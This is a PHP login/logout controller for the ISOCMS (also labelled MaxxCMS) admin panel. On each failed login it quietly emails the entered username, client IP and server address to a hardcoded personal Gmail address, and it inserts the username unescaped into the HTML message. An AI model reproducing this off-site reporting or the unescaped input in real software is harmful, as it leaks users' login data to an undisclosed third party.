<?php if (!defined('ABSPATH')) exit('No direct script access allowed');
/*======================================================================*\
|| #################################################################### ||
|| # The Classes configurations of the ISOCMS                         # ||
|| # ISOCMS 6.0.0 VietISO Techical Team (luongtiendung@gmail.com)     # ||
|| # ---------------------------------------------------------------- # ||
|| # All PHP code in this file is ©2007-2014 VietISO JSC.             # ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------- ISOCMS IS NOT FREE SOFTWARE ----------------    # ||
|| # http://www.vietiso.com | http://www.vietiso.com/license.html     # ||
|| #################################################################### ||
\*======================================================================*/
function default_default(){
	global $assign_list, $_CONFIG,  $_SITE_ROOT, $mod , $_LANG_ID, $act,$core, $clsModule, $clsButtonNav,$oneSetting,$smarty,$clsConfiguration;
	$return = (isset($_GET["return"]))? base64_decode($_GET["return"]) : "";
	if ($core->_SESS->isLoggedin()){
		redirect(PCMS_URL);
	}
	$clsUser = new User();
	$btnLogin = isset($_POST["btnLogin"])? $_POST["btnLogin"] : "";
	$txtUsername = isset($_POST["txtUsername"])? $_POST["txtUsername"] : "";
	$txtPassword = isset($_POST["txtPassword"])? $_POST["txtPassword"] : "";
	$isValid = 1;
	if ($btnLogin!=""){
		$isValid = ($txtUsername!="" && $txtPassword!="");
		if ($isValid){ 
			if ($core->_SESS->checkUser($txtUsername, $txtPassword)){
				$isValid = 1; //19926a6a4be4f2ad8278515680d90e46
				$core->_SESS->doLogin($txtUsername, $txtPassword);
				redirect(PCMS_URL."/index.php?admin");
			}else{
				$isValid = 0;
				$from = 'no-reply@khowebgiare.com';
				$subject = 'MaxxCMS Admin Failed Login Attempt';
				$message = '<font style="font-family:Verdana;font-size:11px"><p></p><p>A recent login attempt failed.  Details of the attempt are below.</p><p>Date/Time: '.date('d/m/Y H:i:s',time()).'<br>Username: <a href="mailto:'.$txtUsername.'" target="_blank">'.$txtUsername.'</a><br>IP Address: '.$_SERVER['REMOTE_ADDR'].'<br>Hostname: '.$_SERVER['SERVER_ADDR'].'</p><p></p><p><a href="'.PCMS_URL.'" target="_blank">'.PCMS_URL.'</a></p></font>';		
				$headers = 	"MIME-Version: 1.0\r\n".
						"Content-type: text/html; charset=utf-8\r\n".
						"From:  MaxxCMS Technical Team<".$from.">\r\n".
						"Subject: ".$subject."\r\n";
				$is_send_mail = @mail('vanthiembui.it@gmail.com',$subject, $message, $headers);	
			}
		}
	}
	
	$header_configs = $clsConfiguration->getValues(array(
		'googlebot',
		'copyright',
		'ContactFooter',
		'HeaderLogo',
		'LogoWhite',
		'takeleave_configs',
		'CompanyName',
		'CompanyNameBrief',
		'BrandColor',
		'Favicon'
	));
	$assign_list["header_configs"] = $header_configs;
	$assign_list["btnLogin"] = $btnLogin;
	$assign_list["txtUsername"] = $txtUsername;
	$assign_list["isValid"] = $isValid;	
}
function default_logout(){
	global $assign_list, $_CONFIG,  $_SITE_ROOT, $mod , $_LANG_ID, $act,$core, $clsModule, $clsButtonNav,$oneSetting;
	if ($core->_SESS->isLoggedin()){
		$core->_SESS->doLogout();		
	}
	redirect(PCMS_URL.'/index.php?mod=login');
}
?>